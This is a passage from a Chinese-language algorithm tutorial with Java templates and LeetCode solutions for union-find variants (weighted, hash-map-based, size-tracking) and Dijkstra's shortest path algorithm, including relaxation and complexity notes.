 int findParent(int x) {\n    if (x == parent[x]) {\n      return x;\n    } \n    // 保存节点x没有进行路径压缩时的父节点。这样做是为了方便后续获取父节点的weight来更新节点x的weight\n    int origin = parent[x];\n    parent[x] = findParent(parent[x]);\n    // 更新weight[x], 具体如何更新，根据情况而定\n    weight[x] *= weight[origin];\n    return parent[x];\n  }\n\n  void unionSets(int a, int b, double value) {\n    int rootA = findParent(a);\n    int rootB = findParent(b);\n    \n    if (rootA != rootB) {\n      parent[rootA] = rootB;\n      // 更新weight[rootA], 具体如何更新，根据情况而定\n      weight[rootA] = value * weight[b] / weight[a];\n      cnt--;\n    }\n  }\n}\n```\n\n##### 例题1: 除法求值\n\n[除法求值](https://leetcode.cn/problems/evaluate-division/)\n\n给你一个变量对数组 equations 和一个实数值数组 values 作为已知条件，其中 $equations[i] = [A_i, B_i]$ 和 values[i] 共同表示等式 $A_i / B_i = values[i]$ 。每个 $A_i$ 或 $B_i$ 是一个表示单个变量的字符串。\n\n另有一些以数组 queries 表示的问题，其中 $queries[j] = [C_j, D_j]$ 表示第 j 个问题，请你根据已知条件找出 $C_j / D_j = ?$ 的结果作为答案。\n\n返回 所有问题的答案 。如果存在某个无法确定的答案，则用 -1.0 替代这个答案。如果问题中出现了给定的已知条件中没有出现的字符串，也需要用 -1.0 替代这个答案。\n\n注意：输入总是有效的。你可以假设除法运算中不会出现除数为 0 的情况，且不存在任何矛盾的结果。\n\n示例 1：\n```txt\n输入：equations = [[\"a\",\"b\"],[\"b\",\"c\"]], values = [2.0,3.0], queries = [[\"a\",\"c\"],[\"b\",\"a\"],[\"a\",\"e\"],[\"a\",\"a\"],[\"x\",\"x\"]]\n输出：[6.00000,0.50000,-1.00000,1.00000,-1.00000]\n解释：\n条件：a / b = 2.0, b / c = 3.0\n问题：a / c = ?, b / a = ?, a / e = ?, a / a = ?, x / x = ?\n结果：[6.0, 0.5, -1.0, 1.0, -1.0 ]\n```\n\n###### 分析\n文字解释： https://leetcode.cn/problems/evaluate-division/solution/399-chu-fa-qiu-zhi-nan-du-zhong-deng-286-w45d/\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/948WwjXili4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n\n代码：\n```java\nclass Solution {\n  public double[] calcEquation(List<List<String>> equations, double[] values, List<List<String>> queries) {\n\n    DisjointSet disjointSet = new DisjointSet(equations.size() * 2);\n    // 第 1 步：预处理，将变量的值与 id 进行映射，使得并查集的底层使用数组实现，方便编码\n    Map<String, Integer> map = new HashMap();\n    int id = 0;\n    for (int i = 0; i < equations.size(); i++) {\n      List<String> equation = equations.get(i);\n      String a = equation.get(0);\n      String b = equation.get(1);\n      if (!map.containsKey(a)) {\n        map.put(a, id++); \n      }\n      if (!map.containsKey(b)) {\n        map.put(b, id++); \n      }\n      disjointSet.unionSets(map.get(a), map.get(b), values[i]);\n    }\n    \n    // 第 2 步：做查询 \n    double[] res = new double[queries.size()];\n    for (int i = 0; i < queries.size(); i++) {\n      List<String> querie = queries.get(i);\n      String c = querie.get(0);\n      String d = querie.get(1);\n      Integer cId = map.get(c);\n      Integer dId = map.get(d);\n      if (cId == null || dId == null) {\n        res[i] = -1; \n        continue;\n      }\n      if (disjointSet.findParent(cId) != disjointSet.findParent(dId)) {\n        res[i] = -1;\n        continue;\n      }\n      res[i] = disjointSet.weight[cId] / disjointSet.weight[dId];\n    }\n    return res;\n  }\n\n  class DisjointSet {\n    int[] parent;\n    // 指向的父结点的权值\n    double[] weight;\n\n    public DisjointSet(int n) {\n      parent = new int[n];\n      weight = new double[n];\n      for (int i = 0; i < n; i++) {\n        parent[i] = i;\n        weight[i] = 1;\n      }\n    }\n\n    int findParent(int x) {\n      if (x == parent[x]) {\n        return x;\n      } \n      int origin = parent[x];\n      parent[x] = findParent(parent[x]);\n      weight[x] *= weight[origin];\n      return parent[x];\n    }\n\n    void unionSets(int a, int b, double value) {\n      int rootA = findParent(a);\n      int rootB = findParent(b);\n      \n      if (rootA != rootB) {\n        parent[rootA] = rootB;\n        weight[rootA] = value * weight[b] / weight[a];\n      }\n    }\n  }\n\n}\n```\n\n#### 初始化时节点总数不确定的并查集\n当初始化时节点总数不确定或者是可能被选择的节点个数太多时，例如可能被选中的节点编号为1~100000，但是需要用到的节点个数只有500个，远小于100000个。此时用`int[] parent`就显得不合适，因为我们需要开辟长度100000的数组。为了提高效率，我们可以使用`Map<Integer, Integer> parent`来存储，key为节点编号；value为该节点的父节点。\n\n模版：\n```java\nclass DisjointSet {\n  // key：节点编号；value：该节点的父节点\n  Map<Integer, Integer> parent;\n  // 连通分量的个数\n  int cnt;\n  \n  public DisjointSet() {\n    parent = new HashMap();\n    // 刚初始化话时，parent中节点个数为0，所以连通分量个数为0\n    cnt = 0;\n  }\n\n  int findParent(int x) {\n    // 如果parent没有统计当前节点x, 则将节点x添加到parent中，节点x的父节点为它自己。此时连通分量个数加1\n    if (!parent.containsKey(x)) {\n      parent.put(x, x);\n      cnt++;\n    }\n\n    if (x == parent.get(x)) {\n      return x;\n    }\n    parent.put(x, findParent(parent.get(x)));\n    return parent.get(x);\n  }\n\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent.put(a, b);\n      // 连通分量个数减1\n      cnt--;\n    }\n  }\n}\n```\n\n##### 例题1: 移除最多的同行或同列石头\n[移除最多的同行或同列石头](https://leetcode.cn/problems/most-stones-removed-with-same-row-or-column/)\n\nn 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。\n\n如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。\n\n给你一个长度为 n 的数组 stones ，其中 $stones[i] = [x_i, y_i]$ 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。\n\n示例 1：\n```txt\n输入：stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]]\n输出：5\n解释：一种移除 5 块石头的方法如下所示：\n1. 移除石头 [2,2] ，因为它和 [2,1] 同行。\n2. 移除石头 [2,1] ，因为它和 [0,1] 同列。\n3. 移除石头 [1,2] ，因为它和 [1,0] 同行。\n4. 移除石头 [1,0] ，因为它和 [0,0] 同列。\n5. 移除石头 [0,1] ，因为它和 [0,0] 同行。\n石头 [0,0] 不能移除，因为它没有与另一块石头同行/列。\n```\n\n###### 分析\n文字解析：https://leetcode.cn/problems/most-stones-removed-with-same-row-or-column/solution/947-yi-chu-zui-duo-de-tong-xing-huo-tong-ezha/\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ZvY-1X0gN2I\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int removeStones(int[][] stones) {\n    int stonesLength = stones.length;\n    DisjointSet disjointSet = new DisjointSet();\n    for (int i = 0; i < stonesLength; i++) {\n      disjointSet.unionSets(stones[i][0] + 10001, stones[i][1]);\n    }\n    return stonesLength - disjointSet.cnt;\n  }\n  \n  class DisjointSet {\n    // key：节点；value：该节点的父节点\n    Map<Integer, Integer> parent;\n    int cnt;\n    \n    public DisjointSet() {\n      parent = new HashMap();\n      cnt = 0;\n    }\n\n    int findParent(int x) {\n      // 如果parent没有统计当前节点x\n      if (!parent.containsKey(x)) {\n        parent.put(x, x);\n        cnt++;\n        return x;\n      }\n      if (x == parent.get(x)) {\n        return x;\n      }\n      parent.put(x, findParent(parent.get(x)));\n      return parent.get(x);\n    }\n\n    void unionSets(int a, int b) {\n      a = findParent(a);\n      b = findParent(b);\n      if (a != b) {\n        parent.put(a, b);\n        cnt--;\n      }\n    }\n  }\n}\n```\n\n#### 需要记录每个连通分量中节点个数\n##### 模版\n```java\nclass DisjointSet {\n  int[] parent;\n  // 记录每个连通分量中的节点个数\n  int[] size;\n  // 连通分量的个数\n  int cnt;\n\n  public DisjointSet(int n) {\n    cnt = n;\n    // 初始化parent\n    parent = new int[n];\n    size = new int[n];\n    for (int i = 0; i < n; i++) {\n      parent[i] = i;\n      size[i] = 1;\n    }\n  }\n\n  // 查找x属于哪个连通分支\n  int findParent(int x) {\n    if (x == parent[x]) {\n      return x;\n    }\n    parent[x] = findParent(parent[x]);\n    return parent[x];\n  }\n\n  // 合并2个连通分支\n  void unionSets(int a, int b) {\n    a = findParent(a);\n    b = findParent(b);\n    if (a != b) {\n      parent[a] = b;\n      size[b] += size[a];\n      cnt--;\n    }\n  }\n\n  // 返回x节点所在连通分量的大小\n  int getSize(int x) {\n    return size[findParent(x)];\n  }\n}\n```\n\n##### 例题1: 统计无向图中无法互相到达点对数\n[统计无向图中无法互相到达点对数](https://leetcode.cn/problems/count-unreachable-pairs-of-nodes-in-an-undirected-graph/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220717100319.png)\n\n###### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/P8cpKzUJP_Q\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n- 对于无向图，有`n(n-1)/2`条边的无向图称为完全图，在完全图中任意两个顶点之间都存在边\n- 对于有向图，有`n(n-1)`条边的有向图称为有向完全图，在有向完全图中任意两个顶点之间都存在方向相反的两条弧\n\n###### 代码\n```java\nclass Solution {\n      public long countPairs(int n, int[][] edges) {\n      DisjointSet disjointSet = new DisjointSet(n);\n      for (int i = 0; i < edges.length; i++) {\n        int[] edge = edges[i];\n        disjointSet.unionSets(edge[0], edge[1]);\n      }\n      long res = (long) n * (n - 1) / 2;\n      for (int i = 0; i < n; i++) {\n        if (disjointSet.findParent(i) == i) {\n          int size = disjointSet.getSize(i);\n          res -= (long) size * (size - 1) / 2;\n        }\n      }\n      return res;\n    }\n\n    class DisjointSet {\n      int[] parent;\n      int[] size;\n      // 连通分量的个数\n      int cnt;\n\n      public DisjointSet(int n) {\n        cnt = n;\n        // 初始化parent\n        parent = new int[n];\n        size = new int[n];\n        for (int i = 0; i < n; i++) {\n          parent[i] = i;\n          size[i] = 1;\n        }\n      }\n\n      // 查找x属于哪个连通分支\n      int findParent(int x) {\n        if (x == parent[x]) {\n          return x;\n        }\n        parent[x] = findParent(parent[x]);\n        return parent[x];\n      }\n\n      // 合并2个连通分支\n      void unionSets(int a, int b) {\n        a = findParent(a);\n        b = findParent(b);\n        if (a != b) {\n          parent[a] = b;\n          size[b] += size[a];\n          cnt--;\n        }\n      }\n\n      // 返回x节点所在连通分量的大小\n      int getSize(int x) {\n        return size[findParent(x)];\n      }\n    }\n}\n```\n\n##### 例题2: 元素值大于变化阈值的子数组\n[元素值大于变化阈值的子数组](https://leetcode.cn/problems/subarray-with-elements-greater-than-varying-threshold/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720102510.png)\n\n###### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/nv_fXU3wFqI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n      public int validSubarraySize(int[] nums, int threshold) {\n      int n = nums.length;\n      DisjointSet disjointSet = new DisjointSet(n + 1);\n      Integer[] index = new Integer[n];\n      for (int i = 0; i < n; i++) {\n        index[i] = i; \n      }\n      Arrays.sort(index, (a, b) -> nums[b] - nums[a]);\n      for (int k = 1, i = 0; k <= n; k++) {\n        while (i < n && nums[index[i]] > threshold / k) {\n          disjointSet.unionSets(index[i], index[i] + 1);\n          if (disjointSet.getSize(index[i]) - 1 >= k) return k;\n          i++;\n        }\n      }\n      return -1;\n    }\n\n    class DisjointSet {\n      private int[] parent;\n      private int[] size;\n      // 连通分量的个数\n      int cnt;\n\n      public DisjointSet(int n) {\n        cnt = n;\n        // 初始化parent\n        parent = new int[n];\n        size = new int[n];\n        for (int i = 0; i < n; i++) {\n          parent[i] = i;\n          size[i] = 1;\n        }\n      }\n\n      // 查找x属于哪个连通分支\n      int findParent(int x) {\n        if (x == parent[x]) {\n          return x;\n        }\n        parent[x] = findParent(parent[x]);\n        return parent[x];\n      }\n\n      // 合并2个连通分支\n      void unionSets(int a, int b) {\n        a = findParent(a);\n        b = findParent(b);\n        if (a != b) {\n          parent[a] = b;\n          size[b] += size[a];\n          cnt--;\n        }\n      }\n\n      // 返回x节点所在连通分量的大小\n      int getSize(int x) {\n        return size[findParent(x)];\n      }\n    }\n\n}\n```\n\n## 最短路径算法\n### 最短路径中的松弛技术\n松弛(relaxation):指对于图 G = (V, E) 中 每个顶点v ∈ V，都设置一个属性dist[v]，用来描述从源点s到v的最短路径上权值的上界。\n\n在开始进行一个最短路径算法时,只知道图中边和权值.随着算法的进行,逐渐得到各对顶点的最短路径的信息.算法会逐渐更新这些信息,每步都会检查是否可以找到一条路径比当前给定路径更短.这一过程通常称为松弛.\n\n下面这两张图即为对边`<u, v>`的松弛操作, 即尝试能否通过 `<u, v>`, 对迄今为止找到的 v 的最短路径进行改进.在这里源点为点 S, 用 dist[i] 表示点 i 到源点 S 的最短路径,现对于边权为 60 的边 `<u, v>`进行松弛操作,如第一副图所示,现到顶点 v, u的最短路径分别为 100 和 30, 即 dist[v] = 100,那么 `dist[v] > dist[u] + W<u, v>`, 所以对于 dist[v] 需要更新,则 S 到 v 的最短路径为 S 到 u 的最短路径经过`<u, v>`到 v, 即 `dist[u] = dist[v] + W<u, v> = 90`.\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220602115627.png)\n\n写成伪代码:\n```java\nRelax( u,  v,  W<u, v> ) { //W<u, v>代表边<u, v> 的权值\n    if ( dist[v] > dist[u] + W<u, v> ) {\n        dist[v] = dist[u] + W<u, v>;\n    }\n}\n```\n\n- Dijkstra是通过遍历**顶点**来进行松弛操作\n- Bellman-Ford是通过遍历**边**来进行松弛操作\n\n### 单源最短路径\n#### Dijkstra算法\n参考：\n- https://zhuanlan.zhihu.com/p/409121513\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/VRQL664Oesk\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n---\n\n首先，我们先看一下 Dijkstra 算法的签名：\n```java\n// 输入一幅图和一个起点 start，计算 start 到其他节点的最短距离\nint[] dijkstra(int start, int[] path, List<int[]>[] graph);\n```\n输入是一幅图 graph 和一个起点 start，返回是一个记录最短路径权重的数组。\n\n比方说，输入起点 start = 3，函数返回一个`int[]`数组，假设赋值给`distTo`变量，那么从起点 3 到节点 6 的最短路径权重的值就是 `distTo[6]`。\n\n是的，标准的 Dijkstra 算法会把从起点 start 到所有其他节点的最短路径都算出来。\n\n当然，如果你的需求只是计算从起点 start 到某一个终点 end 的最短路径，那么在标准 Dijkstra 算法上稍作修改就可以更高效地完成这个需求，这个我们后面再说。\n\n其次，我们也需要一个 State 类来辅助算法的运行：\n```java\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n类似刚才二叉树的层序遍历，我们也需要用 State 类记录一些额外信息，也就是使用 distFromStart 变量记录从起点 start 到当前这个节点的距离。\n\n刚才说普通 BFS 算法中，根据 BFS 的逻辑和无权图的特点，第一次遇到某个节点所走的步数就是最短距离，所以用一个 visited 数组防止走回头路，每个节点只会经过一次。\n\n加权图中的 Dijkstra 算法和无权图中的普通 BFS 算法不同，在 Dijkstra 算法中，你第一次经过某个节点时的路径权重，不见得就是最小的，所以对于同一个节点，我们可能会经过多次，而且每次的 distFromStart 可能都不一样，比如下图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220601134025.png)\n\n我会经过节点 5 三次，每次的 distFromStart 值都不一样，那我取 distFromStart 最小的那次，不就是从起点 start 到节点 5 的最短路径权重了么？\n\n<font color=\"red\">Dijkstra的核心思想就是贪心，即每次从队列中找到dist最小的点，即为从起点到该点的最短路径长度。</font>所以我们在不知道是否能使用Dijkstra时，可以判断一下这个贪心策略是否成立，如果成立，则可以使用Dijkstra。\n\n而Dijkstra的贪心过程可以使用BFS（优先队列版）来实现\n- 元素出队：由于是优先队列，所以出队的元素是当前队列中最优先的元素。由于这个元素的id可能出过队列，即这个元素的id是已经确定好了最短路径。对于这种情况，我们是不做任何处理的。我们可能通过判断State.distFromStart 是否大于 dist[State.id]来判断是否为这种情况，如果大于，则是这种情况。\n- 元素入队：没确定一个节点的最短路径后，都需要更新这个节点相邻的节点的dist值, 而这个更新是通过创建一个新的State,并将该State入队来实现的。\n\n##### 时间复杂度分析\nDijkstra 算法的时间复杂度是多少？你去网上查，可能会告诉你是 `O(ElogV)`，其中 E 代表图中边的条数，V 代表图中节点的个数。\n\n因为理想情况下优先级队列中最多装 V 个节点，对优先级队列的操作次数和 E 成正比，所以整体的时间复杂度就是 `O(ElogV)`。\n\n不过这是理想情况，Dijkstra 算法的代码实现有很多版本，不同编程语言或者不同数据结构 API 都会导致算法的时间复杂度发生一些改变。\n\n比如本文实现的 Dijkstra 算法，使用了 Java 的 PriorityQueue 这个数据结构，这个容器类底层使用二叉堆实现，但没有提供通过索引操作队列中元素的 API，所以队列中会有重复的节点，最多可能有 E 个节点存在队列中。\n\n所以本文实现的 Dijkstra 算法复杂度并不是理想情况下的 `O(ElogV)`，而是 `O(ElogE)`，可能会略大一些，因为图中边的条数一般是大于节点的个数的。\n\n不过就对数函数来说，就算真数大一些，对数函数的结果也大不了多少，所以这个算法实现的实际运行效率也是很高的，以上只是理论层面的时间复杂度分析，供大家参考。\n\n##### 模版1: 需求到达其他所有点的最短路径\n```java\n/**\n* startState: 开始状态\n* graph: 图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n*/\nint[] dijkstra(State startState,  List<int[]>[] graph) {\n  // 优先队列，distFromStart较小的排在前面\n  Queue<State> pq = new PriorityQueue<>((a, b) -> {\n    return a.distFromStart - b.distFromStart;\n  });\n\n  // 初始化dist\n  // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n  int[] dist = new int[graph.length];\n  // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  // 节点start 到节点start的最短路径为0 \n  dist[startState.id] = 0;\n\n  // 用来标记节点是否已经被选择\n  boolean[] isSelected = new boolean[graph.length];\n\n  // 从起点start开始进bfs\n  pq.add(startState);\n\n  while (!pq.isEmpty()) {\n    State currentState = pq.poll();\n    \n    if (isSelected[currentState.id]) {\n      continue;\n    }\n    isSelected[currentState.id] = true;\n\n    // 获取currentState相邻节点\n    List<State> nextStates = new ArrayList();\n    for (int[] neighbor : graph[currentState.id]) {\n      int nextNodeID = neighbor[0];\n      int distToNextNode = dist[currentState.id] + neighbor[1];\n      nextStates.add(new State(nextNodeID, distToNextNode));\n    }\n     \n    for (State nextState : nextStates) {\n      if (isSelected[nextState.id]) continue;\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        pq.add(nextState);\n      }\n    }\n  }\n  \n  return dist;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n###### 例题1: 网络延迟时间\n[网络延迟时间](https://leetcode.cn/problems/network-delay-time/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220601134440.png)\n\n让你求所有节点都收到信号的时间，你把所谓的传递时间看做距离，实际上就是问你「从节点 k 到其他所有节点的最短路径中，最长的那条最短路径距离是多少」，说白了就是让你算从节点 k 出发到其他所有节点的最短路径，就是标准的 Dijkstra 算法。\n\n在用 Dijkstra 之前，别忘了要满足一些条件，加权有向图，没有负权重边，OK，可以用 Dijkstra 算法计算最短路径。\n\n根据我们之前 Dijkstra 算法的框架，我们可以写出下面代码：\n\n代码：\n```java\nclass Solution {\n  public int networkDelayTime(int[][] times, int n, int k) {\n    // 构造图。节点编号是从1开始的，所以要一个大小为n + 1的邻接表\n    List<int[]>[] graph = new LinkedList[n + 1];\n    for (int i = 1; i <= n; i++) {\n      graph[i] = new LinkedList();\n    }\n    for (int[] edge : times) {\n      int from = edge[0];\n      int to = edge[1];\n      int weight = edge[2];\n      // from -> List<(to, weight)>\n      // 邻接表存储图结构，同时存储权重信息\n      graph[from].add(new int[]{to, weight});\n    }\n\n    // 启动 dijkstra 算法计算以节点 k 为起点到其他节点的最短路径\n    int[] dist = dijkstra(new State(k, 0), graph);\n\n    // 找到最长的那一条最短路径\n    int res = 0;\n    for (int i = 1; i < dist.length; i++) {\n      if (dist[i] == Integer.MAX_VALUE) {\n        // 有节点不可达，返回-1\n        return -1;\n      }\n      res = Math.max(res, dist[i]);\n    }\n    return res;\n  }\n  \n  int[] dijkstra(State startState,  List<int[]>[] graph) {\n    // 优先队列，distFromStart较小的排在前面\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distFromStart - b.distFromStart;\n    });\n\n    // 初始化dist\n    // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n    int[] dist = new int[graph.length];\n    // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n    Arrays.fill(dist, Integer.MAX_VALUE);\n    // 节点start 到节点start的最短路径为0 \n    dist[startState.id] = 0;\n\n    // 用来标记节点是否已经被选择\n    boolean[] isSelected = new boolean[graph.length];\n\n    // 从起点start开始进bfs\n    pq.add(startState);\n\n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n\n      if (isSelected[currentState.id]) {\n        continue;\n      }\n      isSelected[currentState.id] = true;\n\n      // 获取currentState相邻节点\n      List<State> nextStates = new ArrayList();\n      for (int[] neighbor : graph[currentState.id]) {\n        int nextNodeID = neighbor[0];\n        int distToNextNode = dist[currentState.id] + neighbor[1];\n        nextStates.add(new State(nextNodeID, distToNextNode));\n      }\n       \n      for (State nextState : nextStates) {\n        if (isSelected[nextState.id]) continue;\n        if (dist[nextState.id] > nextState.distFromStart) {\n          dist[nextState.id] = nextState.distFromStart;\n          pq.add(nextState);\n        }\n      }\n    }\n    \n    return dist;\n  }\n\n  // 辅助类, 用于优先队列\n  class State {\n      // 图节点的 id\n      int id;\n      // 从 start 节点到当前节点的距离\n      int distFromStart;\n  \n      State(int id, int distFromStart) {\n          this.id = id;\n          this.distFromStart = distFromStart;\n      }\n  }\n}\n```\n\n###### 例题2: 阈值距离内邻居最少的城市\n[阈值距离内邻居最少的城市](https://leetcode.cn/problems/find-the-city-with-the-smallest-number-of-neighbors-at-a-threshold-distance/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220602201121.png)\n\n对每个点进行Dijkstra\n\n代码：\n```java\nclass Solution {\n  public int findTheCity(int n, int[][] edges, int distanceThreshold) {\n    List<int[]>[] graph = new ArrayList[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < edges.length; i++) {\n      graph[edges[i][0]].add(new int[]{edges[i][1], edges[i][2]});\n      graph[edges[i][1]].add(new int[]{edges[i][0], edges[i][2]});\n    }\n    int res = 0;\n    int minCnt = Integer.MAX_VALUE;\n    for (int i = 0; i < n; i++) {\n      int[] dist = dijkstra(new State(i, 0), graph);\n      int cnt = 0;\n      for (int j = 0; j < n; j++) {\n        if (dist[j] <= distanceThreshold) {\n          cnt++;\n        }\n      }\n      if (cnt != 0 && minCnt >= cnt) {\n        res = i;\n        minCnt = cnt;\n      }\n    }\n    return res;\n  }\n\n  int[] dijkstra(State startState, List<int[]>[] graph) {\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distFromStart - b.distFromStart;\n    });\n    \n    int[] dist = new int[graph.length];\n    Arrays.fill(dist, Integer.MAX_VALUE);\n    dist[startState.id] = 0;\n\n    boolean[] isSelected = new boolean[graph.length];\n\n    pq.add(startState);\n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n\n      if (isSelected[currentState.id]) {\n        continue;\n      }\n      isSelected[currentState.id] = true;\n\n      List<State> nextStates = new ArrayList();\n      for (int[] neighbor : graph[currentState.id]) {\n        nextStates.add(new State(neighbor[0], dist[currentState.id] + neighbor[1]));\n      }\n\n      for (State nextState : nextStates) {\n        if (isSelected[nextState.id]) continue;\n        if (dist[nextState.id] > nextState.distFromStart) {\n          dist[nextState.id] = nextState.distFromStart;\n          pq.add(nextState);\n        }\n      }\n      \n    }\n    return dist;\n  }\n    \n  class State {\n    int id;\n    int distFromStart;\n    public State(int id, int distFromStart) {\n      this.id = id;\n      this.distFromStart = distFromStart;\n    }\n  }\n\n}\n```\n\n###### 例题3: 细分图中的可到达结点\n[细分图中的可到达结点](https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220602212459.png)\n\n```代码\nclass Solution {\n\n  public int reachableNodes(int[][] edges, int maxMoves, int n) {\n    List<int[]>[] graph = new ArrayList[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList();\n    }\n    for (int i = 0; i < edges.length; i++) {\n      graph[edges[i][0]].add(new int[]{edges[i][1], edges[i][2]});\n      graph[edges[i][1]].add(new int[]{edges[i][0], edges[i][2]});\n    } \n    int res = 0; \n    int[] dist = dijkstra(new State(0, 0), graph);\n    for (int i = 0; i < edges.length; i++) {\n      // 这条边点起点还能在这条边上走多少个顶点\n      int right = maxMoves - dist[edges[i][0]] < 0 ? 0 : maxMoves - dist[edges[i][0]];\n      // 这条边点终点还能在这条边上走多少个顶点\n      int left = maxMoves - dist[edges[i][1]] < 0 ? 0 : maxMoves - dist[edges[i][1]];\n      res += (right + left) > edges[i][2] ? edges[i][2] : right + left;\n    }\n    for (int i = 0; i < n; i++) {\n      if (dist[i] <= maxMoves) {\n        res++;\n      }\n    }\n    return res;\n  }\n\n  int[] dijkstra(State startState,  List<int[]>[] graph) {\n    // 优先队列，distFromStart较小的排在前面\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distFromStart - b.distFromStart;\n    });\n\n    // 初始化dist\n    // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n    int[] dist = new int[graph.length];\n    // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n    Arrays.fill(dist, Integer.MAX_VALUE);\n    // 节点start 到节点start的最短路径为0 \n    dist[startState.id] = 0;\n\n    boolean[] isSelected = new boolean[graph.length];\n\n    // 从起点start开始进bfs\n    pq.add(startState);\n\n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n\n      if (isSelected[currentState.id]) {\n        continue;\n      }\n      isSelected[currentState.id] = true;\n\n      // 获取currentState相邻节点\n      List<State> nextStates = new ArrayList();\n      for (int[] neighbor : graph[currentState.id]) {\n        int nextNodeID = neighbor[0];\n        int distToNextNode = dist[currentState.id] + neighbor[1] + 1;\n        nextStates.add(new State(nextNodeID, distToNextNode));\n      }\n       \n      for (State nextState : nextStates) {\n        if (isSelected[nextState.id]) continue;\n        if (dist[nextState.id] > nextState.distFromStart) {\n          dist[nextState.id] = nextState.distFromStart;\n          pq.add(nextState);\n        }\n      }\n    }\n    //System.out.println(Arrays.toString(dist)); \n    return dist;\n  }\n\n\n\n  class State {\n    int id;\n    int distFromStart;\n    public State(int id, int distFromStart) {\n      this.id = id;\n      this.distFromStart = distFromStart;\n    }\n  }\n}\n```\n\n\n##### 模版2: 只需求到达某个点的最短路径\n```java\n/**\n* startState: 开始状态\n* graph: 图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n* end: 目标点\n*/\nint dijkstra(State startState,  List<int[]>[] graph, int end) {\n  // 优先队列，distFromStart较小的排在前面\n  Queue<State> pq = new PriorityQueue<>((a, b) -> {\n    return a.distFromStart - b.distFromStart;\n  });\n\n  // 初始化dist\n  // dist[i] 的值就是节点 start 到达节点 i 的最短路径权重\n  int[] dist = new int[graph.length];\n  // 起始点到各点的最短路径长度为Integer.MAX_VALUE\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  // 节点start 到节点start的最短路径为0 \n  dist[startState.id] = 0;\n\n  // 用来标记节点是否已经被选择\n  boolean[] isSelected = new boolean[graph.length];\n\n  // 从起点start开始进bfs\n  pq.add(startState);\n\n  while (!pq.isEmpty()) {\n    State currentState = pq.poll();\n    \n    // 如果currentState是目标点\n    if (currentState.id == end) {\n      return currentState.distFromStart;\n    }\n\n    if (isSelected[currentState.id]) {\n      continue;\n    }\n    isSelected[currentState.id] = true;\n\n\n    // 获取currentState相邻节点\n    List<State> nextStates = new ArrayList();\n    for (int[] neighbor : graph[currentState.id]) {\n      int nextNodeID = neighbor[0];\n      int distToNextNode = dist[currentState.id] + neighbor[1];\n      nextStates.add(new State(nextNodeID, distToNextNode));\n    }\n     \n    for (State nextState : nextStates) {\n      if (isSelected[nextState.id]) continue;\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        pq.add(nextState);\n      }\n    }\n  }\n\n  // 如果到达这里，说明从 start 开始无法到达 end，返回 -1\n  return -1;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int 